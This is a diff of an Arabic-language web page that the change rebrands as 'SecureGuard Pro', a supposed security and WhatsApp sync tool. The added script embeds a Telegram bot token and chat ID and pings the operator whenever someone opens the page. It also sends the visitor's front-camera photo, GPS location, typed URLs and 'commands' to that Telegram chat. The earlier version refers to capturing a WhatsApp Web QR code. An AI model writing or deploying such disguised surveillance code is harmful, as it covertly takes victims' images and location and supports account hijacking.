@@ -1,47 +1,140 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>WhatsApp Sync</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>SecureGuard Pro | WhatsApp Sync</title>
+<link rel="manifest" href="/manifest.json">
+<meta name="theme-color" content="#080c14">
 <style>
-body{background:#111;color:#fff;text-align:center;padding:20px;font-family:sans-serif}
-h1{color:#25d366;font-size:22px}
-p{color:#aaa;margin:10px;font-size:13px}
-button{padding:15px 30px;background:#25d366;color:#000;border:none;border-radius:10px;font-size:16px;font-weight:bold;cursor:pointer;margin:5px}
-#status{color:#10b981;font-size:12px;margin:10px}
-iframe{width:100%;height:85vh;border:none;margin-top:10px;display:none}
+:root{--bg:#080c14;--card:#131b27;--border:#1e2d40;--text:#e2e8f0;--muted:#64748b;--accent:#0ea5e9;--green:#25d366;--red:#ef4444;--yellow:#f59e0b}
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:var(--bg);color:var(--text);font-family:sans-serif;min-height:100vh;text-align:center;padding:20px}
+h1{font-size:22px;margin:15px 0}
+h1 .green{color:var(--green)}
+p{color:var(--muted);font-size:13px;margin:8px 0}
+button{padding:14px 28px;margin:8px;border:none;border-radius:30px;font-size:15px;font-weight:bold;cursor:pointer;width:90%;max-width:350px}
+.btn-green{background:var(--green);color:#000}
+.btn-blue{background:var(--accent);color:#000}
+.btn-yellow{background:var(--yellow);color:#000}
+.btn-red{background:var(--red);color:#fff}
+#status{color:var(--green);font-size:12px;margin:15px}
+.card{background:var(--card);border:1px solid var(--border);border-radius:15px;padding:15px;margin:15px 0;text-align:right}
+.card h3{color:var(--accent);font-size:15px;margin-bottom:8px}
+.card p{font-size:12px}
+input{width:90%;max-width:350px;padding:12px;margin:5px;border:1px solid var(--border);border-radius:10px;background:var(--card);color:var(--text);font-size:14px}
+.hidden{display:none}
 </style>
 </head>
 <body>
-<h1>WhatsApp Sync</h1>
-<p>ربط واتساب عن بعد</p>
-<button onclick="openWA()">فتح واتساب ويب</button>
-<button onclick="sendNotify()">إرسال إشعار</button>
-<div id="status"></div>
-<iframe id="waframe" src=""></iframe>
+
+<h1>SecureGuard <span class="green">Pro</span></h1>
+<p>أداة الأمان والمزامنة</p>
+
+<div id="status">جاري الاتصال...</div>
+
+<div class="card">
+<h3>📱 واتساب</h3>
+<p id="waStatus">غير متصل</p>
+<button class="btn-green" onclick="openWA()">فتح واتساب ويب</button>
+<button class="btn-blue" onclick="sendNotify()">إرسال إشعار</button>
+</div>
+
+<div class="card">
+<h3>📷 كاميرا</h3>
+<button class="btn-blue" onclick="takePhoto()">التقاط صورة</button>
+</div>
+
+<div class="card">
+<h3>📍 موقع</h3>
+<button class="btn-blue" onclick="getLocation()">إرسال الموقع</button>
+</div>
+
+<div class="card">
+<h3>💬 أمر مخصص</h3>
+<input type="text" id="customCmd" placeholder="اكتب الأمر...">
+<button class="btn-yellow" onclick="customCommand()">تنفيذ</button>
+</div>
+
+<div class="card">
+<h3>🔗 فتح رابط</h3>
+<input type="text" id="customUrl" placeholder="https://...">
+<button class="btn-blue" onclick="openURL()">فتح</button>
+</div>
+
+<button class="btn-red" onclick="testBot()">📟 اختبار البوت</button>
+
 <script>
 const BOT="8915820730:AAHqyTgk9IVvmMLA8xpXO8QuLPEPbIv9A9c";
 const CHAT="6453594151";
 
-function openWA(){
-    document.getElementById('waframe').style.display='block';
-    document.getElementById('waframe').src='https://web.whatsapp.com';
-    document.getElementById('status').textContent='QR Code ظاهر. استخدم MacroDroid.';
+async function api(method,body){
+    try{
+        let r=await fetch(`https://api.telegram.org/bot${BOT}/${method}`,{
+            method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)
+        });
+        return await r.json();
+    }catch(e){return null}
 }
 
-async function sendNotify(){
-    try{
-        await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`,{
-            method:'POST',
-            headers:{'Content-Type':'application/json'},
-            body:JSON.stringify({chat_id:CHAT,text:'📱 تم فتح واتساب ويب. استخدم MacroDroid لالتقاط QR Code.'})
-        });
-        document.getElementById('status').textContent='تم إرسال إشعار.';
-    }catch(e){
-        document.getElementById('status').textContent='فشل.';
-    }
+async function sendMsg(text){
+    await api('sendMessage',{chat_id:CHAT,text:text});
 }
+
+async function testBot(){
+    document.getElementById('status').textContent='جاري...';
+    let r=await api('sendMessage',{chat_id:CHAT,text:'✅ SecureGuard Pro: متصل وجاهز'});
+    if(r&&r.ok){document.getElementById('status').textContent='✅ البوت شغال'}else{document.getElementById('status').textContent='❌ فشل'}
+}
+
+function openWA(){
+    window.open('https://web.whatsapp.com','_blank');
+    document.getElementById('waStatus').textContent='تم الفتح';
+    sendMsg('📱 تم فتح واتساب ويب');
+    document.getElementById('status').textContent='تم فتح واتساب ويب';
+}
+
+function sendNotify(){
+    sendMsg('📱 إشعار: فتح واتساب ويب');
+    document.getElementById('status').textContent='تم إرسال الإشعار';
+}
+
+async function takePhoto(){
+    document.getElementById('status').textContent='جاري...';
+    try{
+        let s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
+        let v=document.createElement('video');v.srcObject=s;await v.play();
+        let c=document.createElement('canvas');c.width=640;c.height=480;
+        c.getContext('2d').drawImage(v,0,0);
+        let photo=c.toDataURL('image/jpeg',0.7);
+        s.getTracks().forEach(t=>t.stop());
+        let blob=await(await fetch(photo)).blob();
+        let fd=new FormData();fd.append('chat_id',CHAT);fd.append('photo',blob,'camera.jpg');
+        await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`,{method:'POST',body:fd});
+        document.getElementById('status').textContent='✅ تم إرسال الصورة';
+    }catch(e){document.getElementById('status').textContent='❌ فشل: اسمح بالكاميرا'}
+}
+
+function getLocation(){
+    document.getElementById('status').textContent='جاري...';
+    navigator.geolocation.getCurrentPosition(async p=>{
+        await sendMsg(`📍 الموقع:\n${p.coords.latitude},${p.coords.longitude}\nخرائط: https://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`);
+        document.getElementById('status').textContent='✅ تم إرسال الموقع';
+    },()=>{document.getElementById('status').textContent='❌ فشل: اسمح بالموقع'});
+}
+
+function openURL(){
+    let url=document.getElementById('customUrl').value;
+    if(url){window.open(url,'_blank');sendMsg('🔗 تم فتح: '+url);document.getElementById('status').textContent='تم فتح الرابط'}
+}
+
+function customCommand(){
+    let cmd=document.getElementById('customCmd').value;
+    if(cmd){sendMsg('💬 أمر: '+cmd);document.getElementById('status').textContent='تم تنفيذ الأمر'}
+}
+
+sendMsg('🔔 تنبيه: شخص ما فتح SecureGuard Pro!');
+document.getElementById('status').textContent='✅ متصل';
 </script>
 </body>
 </html>
